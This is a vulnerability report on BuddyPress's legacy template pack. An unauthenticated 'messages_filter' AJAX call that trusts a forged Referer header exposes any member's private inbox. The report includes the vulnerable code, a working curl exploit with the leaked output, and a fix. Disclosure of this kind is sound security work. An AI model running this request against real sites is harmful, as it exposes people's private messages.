## TL;DR
BuddyPress's legacy template pack registers the `messages_filter` AJAX action for logged-out visitors as well as logged-in users. The handler resolves whose inbox to render from the `Referer` header — fully client-controlled — and has no login check, no nonce, and no ownership check. Anyone who knows a member's username can read their entire private message inbox without an account.

**No cookies. No login. One POST. Full private inbox exposed.**

## Environment
| Component | Version |
|---|---|
| WordPress | 7.1.2 |
| BuddyPress | 14.5.2 (exact zip reviewed: https://downloads.wordpress.org/plugin/buddypress.14.5.2.zip) |
| PHP | 8.4.24 (cli) |
| MariaDB | 11.8.8-MariaDB (Debian) |

## Description
BuddyPress's legacy template pack registers `messages_filter` on both `wp_ajax_` and `wp_ajax_nopriv_`, so it is reachable with zero authentication. The handler resolves the "displayed user" from the HTTP `Referer` header path rather than the authenticated session, then renders that user's private message inbox with no login check, no nonce, and no ownership check.

## Root Cause

- File: `bp-templates/bp-legacy/buddypress-functions.php:896`
- Vulnerable code:

```php
function bp_legacy_theme_messages_template_loader() {
    bp_get_template_part( 'members/single/messages/messages-loop' );
    exit();
}
```

Registered at `buddypress-functions.php:139` (`'messages_filter' => 'bp_legacy_theme_messages_template_loader'`) via both `wp_ajax_messages_filter` and `wp_ajax_nopriv_messages_filter`. The "displayed user" it renders for is set earlier in the request from `bp_get_referer_path()` — an attacker-controlled `Referer` header — not from the session.

- Why it's wrong: the function performs no `is_user_logged_in()`, nonce, or ownership check before rendering the resolved user's private message thread loop.

## Steps to Reproduce

**Privilege level:** none — no account, no cookies required.

---

**Step 1 — Control: confirm no bypass without a Referer**

```bash
curl -s -i -X POST http://127.0.0.1:8977/wp-admin/admin-ajax.php \
  --data "action=messages_filter"
```

```html
HTTP/1.1 200 OK
<div id="message" class="info">
    <p>Sorry, no messages were found.</p>
</div>
```

No user context resolved — empty result as expected.

---

**Step 2 — Exploit: set Referer to the victim's message-view URL**

Seed data: a private message thread (id=1) between `victim` and `bystander`, subject "Secret".

```bash
curl -s -i -X POST http://127.0.0.1:8977/wp-admin/admin-ajax.php \
  -H "Referer: http://127.0.0.1:8977/members/victim/messages/view/1/" \
  --data "action=messages_filter"
```

```html
HTTP/1.1 200 OK
<div class="pag-count" id="messages-dir-count">
    Viewing 1 message
</div>
...
<td class="thread-from">
    <img ... alt="Profile picture of bystander" /> From: <a href="http://127.0.0.1:8977/members/bystander/">bystander</a>
    <span class="activity">September 25, 2026 at 12:59 am</span>
</td>
<td class="thread-info">
    <p><a href="http://127.0.0.1:8977/members/victim/messages/view/1/" ...>Secret</a></p>
    <p class="thread-excerpt">This is private content only victim and bystander should see.</p>
</td>
```

The full private thread — subject, sender, and message excerpt — is returned to a fully anonymous, cookie-less request.

## Recommendation
Add `is_user_logged_in()` and `bp_is_my_profile() || bp_current_user_can( 'bp_moderate' )` checks to `bp_legacy_theme_messages_template_loader()` before rendering, and remove the `wp_ajax_nopriv_messages_filter` registration entirely.

## Impact
Any unauthenticated attacker who knows (or guesses) a member's username can read that member's entire private message inbox on any BuddyPress site running the legacy template pack, with no login and no admin cooperation required. This includes message subjects, senders, and content excerpts, and is trivially scriptable to bulk-harvest private conversations across all members of a site.

### **Note: This issue was reported via HackerOne and marked as a duplicate of a prior report — meaning it was already known to the maintainers at the time of submission.**
